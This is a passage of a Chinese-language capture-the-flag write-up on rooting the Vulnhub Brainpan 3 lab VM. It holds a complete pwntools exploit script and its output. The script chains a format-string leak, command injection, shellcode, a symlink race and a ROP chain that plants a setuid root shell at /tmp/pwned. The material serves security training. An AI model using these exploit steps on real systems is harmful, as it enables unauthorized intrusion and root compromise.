<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python find-good-addr.py </span><br><span class="line">__libc_start_main 0x26800</span><br><span class="line">atol 0xe900</span><br></pre></td></tr></table></figure>

<p>为了使事情更简单，将仅在GOT条目中添加正值。使用atol条目，因为它与系统的差异最小。接下来，需要在二进制文件中找到偏移量，该偏移量累积时等于0xe900。下面是一个可能的列表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x8048595 = 0xc6e8</span><br><span class="line">0x8048dff = 0x2203</span><br><span class="line">0x8048833 = 0x14</span><br><span class="line">0x8048fb9 = 0x1</span><br></pre></td></tr></table></figure>

<p>现在有了系统偏移量，只需要一个小工具即可执行它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x8048786 : call eax;</span><br></pre></td></tr></table></figure>

<p>注意到在用法语句中找到了字符串/tmp/foo。利用它并将其用作执行命令。需要一个或两个命令，当以root身份执行时，将给一个shell。一种方法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /bin/sh /tmp/pwned;</span><br><span class="line">chown root /tmp/pwned;</span><br><span class="line">chmod 4777 /tmp/pwned;</span><br></pre></td></tr></table></figure>

<p>需要将setuid位（4777）设置为puck，以便在root特权下执行二进制文件。一切准备就绪，检查一下最终的ROP链。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">def add_offset(addr):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;Function used to easily add offsets to eax to global rop chain&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    add_to_sum = 0x08048feb</span><br><span class="line">    rop.raw(pop_ebx)</span><br><span class="line">    rop.raw(addr - 0x1270304)</span><br><span class="line">    rop.raw(add_to_sum)</span><br><span class="line"></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">tmpfoo = elf.search(<span class="string">&#x27;/tmp/foo&#x27;</span>).next()</span><br><span class="line">atol = elf.got[<span class="string">&#x27;atol&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_ebx = 0x804859d</span><br><span class="line">call_eax = 0x8048786</span><br><span class="line"></span><br><span class="line">hex_c6e8 = 0x8048595</span><br><span class="line">hex_2203 = 0x8048dff</span><br><span class="line">hex_14 = 0x8048833</span><br><span class="line">hex_1 = 0x8048fb9</span><br><span class="line"></span><br><span class="line">rop.raw(0x8048790)</span><br><span class="line"></span><br><span class="line">add_offset(atol)</span><br><span class="line">add_offset(hex_c6e8)</span><br><span class="line">add_offset(hex_2203)</span><br><span class="line">add_offset(hex_14)</span><br><span class="line">add_offset(hex_1)</span><br><span class="line"></span><br><span class="line">rop.raw(call_eax)    </span><br><span class="line">rop.raw(tmpfoo)</span><br></pre></td></tr></table></figure>

<p>根据先前的挑战，需要通过binjitsu执行这些挑战。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r.sendline(<span class="string">&#x27;echo &quot;cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned&quot; &gt; /tmp/foo&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sc = str(rop)</span><br><span class="line">sc += cyclic(cyclic_find(<span class="string">&#x27;daac&#x27;</span>)-len(sc))</span><br><span class="line">sc += p32(strtok)</span><br><span class="line">sc += <span class="string">&#x27;C&#x27;</span> * (216 - len(sc))</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">data += <span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;s&#x27;</span>*4, sc) </span><br><span class="line">data += <span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(p32(pivot), str(rop))</span><br><span class="line"></span><br><span class="line">pwnmsg_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">    pwnmsg_file += <span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(b.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;python -c &quot;print &#x27;</span>&#123;&#125;<span class="string">&#x27;&quot; &gt;&gt; /opt/.messenger/pwn.msg&#x27;</span><span class="string">&#x27;&#x27;</span>.format(pwnmsg_file))</span><br></pre></td></tr></table></figure>

<p>下面是完善后的一键获取root权限并且拿到flag的python脚本，运行一下看看效果。。。</p>
<p>bp3.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">command</span> <span class="keyword">in</span> [<span class="string">&#x27;uname -a&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;$(&#123;&#125; &gt;&amp;2)&#x27;</span>.format(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;SENDING TO REPORT MODULE&quot;</span>)</span><br><span class="line">    output = r.recvuntil(<span class="string">&#x27;[+]&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[2]</span><br><span class="line">    log.success(<span class="string">&quot;&#123;&#125; - &#123;&#125;&quot;</span>.format(<span class="built_in">command</span>, output))</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;$(/bin/bash -i &gt;&amp;2)&#x27;</span>)</span><br><span class="line">offset = cyclic_find(<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + p32(0x804a080)</span><br><span class="line">buffer = 116 - len(shellcode)</span><br><span class="line">binsh_shellcode = asm(shellcraft.sh())</span><br><span class="line">argv1 = <span class="string">&#x27;&quot;A&quot; * &#123;&#125; + &quot;&#123;&#125;&quot; + &quot;C&quot; * &#123;&#125;&#x27;</span>.format(offset, r<span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>, buffer)</span><br><span class="line">argv2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(enhex(binsh_shellcode)[x:x+2]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(0, len(enhex(binsh_shellcode)), 2))</span><br><span class="line">actual_shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;./cryptor <span class="subst">$(python -c &#x27;print &#123;&#125;&#x27;)</span> <span class="subst">$(python -c &#x27;print <span class="string">&quot;&#123;&#125;&quot;</span>&#x27;)</span>&quot;</span><span class="string">&quot;&quot;</span>.format(argv1, argv2)</span><br><span class="line">log.info(actual_shellcode)</span><br><span class="line">r.sendline(<span class="string">&#x27;cd /home/reynard/private&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(actual_shellcode)</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;reynard&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">log.info(<span class="string">&quot;Shell recevied: reynard&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;&quot;</span><span class="string">&quot; echo &quot;</span></span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import telnetlib</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = 7075</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    os.remove(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">subprocess.check_output([<span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">r = socket.socket()</span><br><span class="line">r.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">os.symlink(<span class="string">&#x27;/home/puck/key.txt&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = r</span><br><span class="line">t.interact()</span><br><span class="line"></span><br><span class="line">r.close()</span><br><span class="line"><span class="string">&quot; &gt; win.py</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;python win.py&quot;</span>)</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">log.success(<span class="string">&quot;Shell received: &#123;&#125;&quot;</span>.format(output))</span><br><span class="line">sleep(1)</span><br><span class="line">log.success(<span class="string">&quot;Insert ROP pun here...&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;msg_admin&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">pivot = rop.search(move=20).address</span><br><span class="line">strtok = elf.got[<span class="string">&#x27;strtok&#x27;</span>]</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">def add_offset(addr):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;Function used to easily add offsets to eax to global rop chain&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    add_to_sum = 0x08048feb</span><br><span class="line">    rop.raw(pop_ebx)</span><br><span class="line">    rop.raw(addr - 0x1270304)</span><br><span class="line">    rop.raw(add_to_sum)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">tmpfoo = elf.search(<span class="string">&#x27;/tmp/foo&#x27;</span>).next()</span><br><span class="line">atol = elf.got[<span class="string">&#x27;atol&#x27;</span>]</span><br><span class="line">pop_ebx = 0x804859d</span><br><span class="line">call_eax = 0x8048786</span><br><span class="line">hex_c6e8 = 0x8048595</span><br><span class="line">hex_2203 = 0x8048dff</span><br><span class="line">hex_14 = 0x8048833</span><br><span class="line">hex_1 = 0x8048fb9</span><br><span class="line">rop.raw(0x8048790)</span><br><span class="line">add_offset(atol)</span><br><span class="line">add_offset(hex_c6e8)</span><br><span class="line">add_offset(hex_2203)</span><br><span class="line">add_offset(hex_14)</span><br><span class="line">add_offset(hex_1)</span><br><span class="line">rop.raw(call_eax)    </span><br><span class="line">rop.raw(tmpfoo)</span><br><span class="line">r.sendline(<span class="string">&#x27;echo &quot;cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned&quot; &gt; /tmp/foo&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;Create our root command file at /tmp/foo&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;echo &quot;cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned&quot; &gt; /tmp/foo&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br><span class="line">sc = str(rop)</span><br><span class="line">sc += cyclic(cyclic_find(<span class="string">&#x27;daac&#x27;</span>)-len(sc))</span><br><span class="line">sc += p32(strtok)</span><br><span class="line">sc += <span class="string">&#x27;C&#x27;</span> * (216 - len(sc))</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">data += <span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;s&#x27;</span>*4, sc) </span><br><span class="line">data += <span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(p32(pivot), str(rop))</span><br><span class="line">pwnmsg_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">    pwnmsg_file += <span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(b.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">r.sendline(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;python -c &quot;print &#x27;</span>&#123;&#125;<span class="string">&#x27;&quot; &gt;&gt; /opt/.messenger/pwn.msg&#x27;</span><span class="string">&#x27;&#x27;</span>.format(pwnmsg_file))</span><br><span class="line">log.info(<span class="string">&#x27;Create our malicious msg file&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;python -c &quot;print &#x27;</span>&#123;&#125;<span class="string">&#x27;&quot; &gt;&gt; /opt/.messenger/pwn.msg&#x27;</span><span class="string">&#x27;&#x27;</span>.format(pwnmsg_file))</span><br><span class="line">r.sendline(<span class="string">&#x27;rm /tmp/pwned&#x27;</span>)</span><br><span class="line">r.clean()</span><br><span class="line">log.info(<span class="string">&quot;Wait for your r00t shellz&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(75):</span><br><span class="line">    r.sendline(<span class="string">&#x27;ls -la /opt/.messenger&#x27;</span>)</span><br><span class="line">    sleep(1)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;pwn.msg&#x27;</span> not <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">r.sendline(<span class="string">&#x27;/tmp/pwned&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;cd /root&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;gzip -d brainpan.8.gz&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;cat brainpan.8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(10):</span><br><span class="line">    r.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Bingo!&quot;</span>)</span><br><span class="line">log.info(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>直接获得root权限和flag，灰常的牛批。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 8455</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[+] uname -a - Linux brainpan3 3.16.0-41-generic <span class="comment">#55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux</span></span><br><span class="line">[+] whoami - anansi</span><br><span class="line">[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">[*] ./cryptor $(python -c <span class="string">&#x27;print &quot;A&quot; * 4 + &quot;\x80\xa0\x04\x08&quot; + &quot;C&quot; * 108&#x27;</span>) $(python -c <span class="string">&#x27;print &quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">[*] Shell recevied: reynard</span><br><span class="line">[+] Shell received: Authentication successful</span><br><span class="line">[+] Insert ROP pun here...</span><br><span class="line">[*] <span class="string">&#x27;/root/vulnhub/brainpan3/2/msg_admin&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Loaded 10 cached gadgets <span class="keyword">for</span> <span class="string">&#x27;msg_admin&#x27;</span></span><br><span class="line">[*] Create our root <span class="built_in">command</span> file at /tmp/foo</span><br><span class="line">[*] <span class="built_in">echo</span> <span class="string">&quot;cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned&quot;</span> &gt; /tmp/foo</span><br><span class="line">[*] chmod +x /tmp/foo</span><br><span class="line">[*] Create our malicious msg file</span><br><span class="line">[*] python -c <span class="string">&quot;print &#x27;\x73\x73\x73\x73\x7c\x90\x87\x04\x08\x9d\x85\x04\x08\x48\xad\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x91\x82\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xfb\x8a\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x2f\x85\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xb5\x8c\xdd\x06\xeb\x8f\x04\x08\x86\x87\x04\x08\xef\x8e\x04\x08\x61\x61\x61\x61\x62\x61\x61\x61\x63\x61\x61\x61\x64\x61\x61\x61\x65\x61\x61\x61\x66\x61\x61\x61\x67\x61\x61\x61\x68\x61\x61\x61\x69\x61\x61\x61\x6a\x61\x61\x61\x6b\x61\x61\x61\x6c\x61\x61\x61\x6d\x61\x61\x61\x6e\x61\x61\x61\x6f\x61\x61\x61\x70\x61\x61\x61\x71\x61\x61\x61\x72\x61\x61\x61\x73\x61\x61\x61\x74\x61\x61\x61\x75\x61\x61\x61\x76\x61\x61\x61\x77\x61\x61\x61\x78\x61\x61\x61\x79\x61\x61\x61\x7a\x61\x61\x62\x62\x61\x61\x62\x63\x61\x61\x62\x64\x61\x61\x62\x65\x61\x61\x62\x66\x61\x61\x62\x67\x61\x61\x62\x68\x61\x61\x62\x69\x61\x61\x62\x6a\x61\x61\x62\x5c\xb0\x04\x08\x0a\xdc\x8d\x04\x08\x7c\x90\x87\x04\x08\x9d\x85\x04\x08\x48\xad\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x91\x82\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xfb\x8a\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x2f\x85\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xb5\x8c\xdd\x06\xeb\x8f\x04\x08\x86\x87\x04\x08\xef\x8e\x04\x08\x0a&#x27;&quot;</span> &gt;&gt; /opt/.messenger/pwn.msg</span><br><span class="line">[*] Wait <span class="keyword">for</span> your r00t shellz</span><br><span class="line">[*] Bingo!</span><br><span class="line">[*] uid=1001(puck) gid=1004(dev) euid=0(root) groups=0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">(root)</span><br><span class="line">$ </span><br><span class="line">root</span><br><span class="line">gzip: brainpan.8.gz: No such file or directory</span><br><span class="line">.TH man 8 <span class="string">&quot;20 May 2015&quot;</span> <span class="string">&quot;3.0&quot;</span> <span class="string">&quot;brainpan 3&quot;</span></span><br><span class="line"></span><br><span class="line">.SH DESCRIPTION</span><br><span class="line">Congratulations, you win! Thanks <span class="keyword">for</span> playing!</span><br><span class="line"></span><br><span class="line">.SH FLAG</span><br><span class="line">.B</span><br><span class="line">flag&#123;tricksy-hobbitses-use-unix&#125;</span><br><span class="line"></span><br><span class="line">.SH BUGS</span><br><span class="line">You found them all. </span><br><span class="line"></span><br><span class="line">.SH AUTHOR</span><br><span class="line">superkojiman - </span><br><span class="line">.B</span><br><span class="line">http://blog.techorganic.com</span><br><span class="line"></span><br><span class="line">.SH TESTERS</span><br><span class="line">Special thanks go to barrebas and Swappage taking the time to <span class="built_in">test</span> Brainpan 3!</span><br><span class="line">.br</span><br><span class="line">barrebas - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/barrebas</span><br><span class="line">.br</span><br><span class="line">Swappage - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/Swappage</span><br><span class="line">$ id</span><br><span class="line">uid=1001(puck) gid=1004(dev) euid=0(root) groups=0(root)</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub209.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub210.jpg"></p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>虚拟机完全启动后，使用nmap进行端口扫描。这显示了1个开放端口1337和一个封闭（防火墙）端口8080，一旦连接到端口1337，将看到Brainpan Console的登录屏幕。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.117 1337</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|</span><br><span class="line">  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | </span><br><span class="line">  |   |  __ &lt;    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | </span><br><span class="line"> ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|</span><br><span class="line"></span><br><span class="line">                                                            by superkojiman</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br><span class="line"></span><br><span class="line">ACCESS CODE:</span><br></pre></td></tr></table></figure>

<p>根据屏幕上的文字，必须处理一个4位数的代码，并且在3次失败的尝试之后，都会创建一个新的代码，因此很难对其进行暴力破解。想到的第一件事是它可能是格式字符串漏洞，并且经过快速测试表明确实如此。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: %p%p%p</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: 0xbff1279c(nil)0x751</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 1</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>当使用格式字符串模式作为小数时，可以在位置3的输出中发现登录代码1873</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: %d-%d-%d-%d-%d-%d-%d</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: -1074714724-0-1873--1074714724-0-10--367016960</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 2</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>可以将格式字符串模式缩短为％3$d，以直接获取当前的登录代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: %3<span class="variable">$d</span></span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: 1873</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 3</span><br><span class="line"></span><br><span class="line">BRUTE-FORCE ATTEMPT DETECTED</span><br><span class="line">PLEASE USE THE NEW CODE DISPLAYED ON YOUR ACCESS TOKEN</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>使用代码登录到Brainpan控制台，显示一个菜单，展示一些选项，并设置了权限，例如AUTH，REPORT和MENU</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-4057</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND:</span><br></pre></td></tr></table></figure>

<p>最有趣的选项是1,2和3.。4显然是一个巨魔。<br>控制台使用选项1告诉我们该构建已禁用报告功能<br>选项2告诉我们该存储库现已可用<br>选项3允许我们更改会话名称。<br>看来此选项具有格式字符串和缓冲区溢出漏洞。<br>存储库选项使我想起8080处于关闭状态的端口，快速重新扫描显示该端口现已打开，当我们浏览至该端口时，我们会看到一个简单的网页。<br>我启动了一个目录bruteforce，它显示了名为“repo”的文件夹，其中包含5个文件。</p>
<p>输入2，然后再扫描8080端口，显示已经开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 2</span><br><span class="line">SELECTED: 2</span><br><span class="line"></span><br><span class="line">CODE REPOSITORY IS NOW AVAILABLE</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p 8080 -v -sV 192.168.56.117 -r</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8080/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)</span><br><span class="line">MAC Address: 08:00:27:90:21:26 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub201.jpg"></p>
<p>名为report的文件引起了我的注意，因为在Brainpan控制台中也有此report选项。我下载了文件并开始对其进行分析。</p>
<h3 id="分析report"><a href="#分析report" class="headerlink" title="分析report"></a>分析report</h3><p>提供所需的参数（报告数据和1或0）时，会得到一个很大的查理·布朗横幅，我不认识这个人，但我敢打赌，他是个好人。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># ./report aa 0</span></span><br><span class="line">               ____</span><br><span class="line">           .-<span class="string">&#x27;&amp;    &#x27;</span>-.</span><br><span class="line">          / __    __  \</span><br><span class="line">         :-(__)--(__)--;</span><br><span class="line">        (      (_       )</span><br><span class="line">         :             ;</span><br><span class="line">          \    __     /</span><br><span class="line">           `-._____.-<span class="string">&#x27;</span></span><br><span class="line"><span class="string">             /`&quot;&quot;&quot;`\</span></span><br><span class="line"><span class="string">            /    ,  \</span></span><br><span class="line"><span class="string">           /|/\/\/\ _\</span></span><br><span class="line"><span class="string">          (_|/\/\/\\__)</span></span><br><span class="line"><span class="string">            |_______|</span></span><br><span class="line"><span class="string">           __)_ |_ (__</span></span><br><span class="line"><span class="string">          (_____|_____)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       YOU&#x27;</span>RE IN THE MATRIX</span><br><span class="line">           CHARLIE BROWN</span><br></pre></td></tr></table></figure>

<p>是时候对可执行文件使用ida进行逆向工程以查看发生了什么。</p>
<ul>
<li>main</li>
</ul>
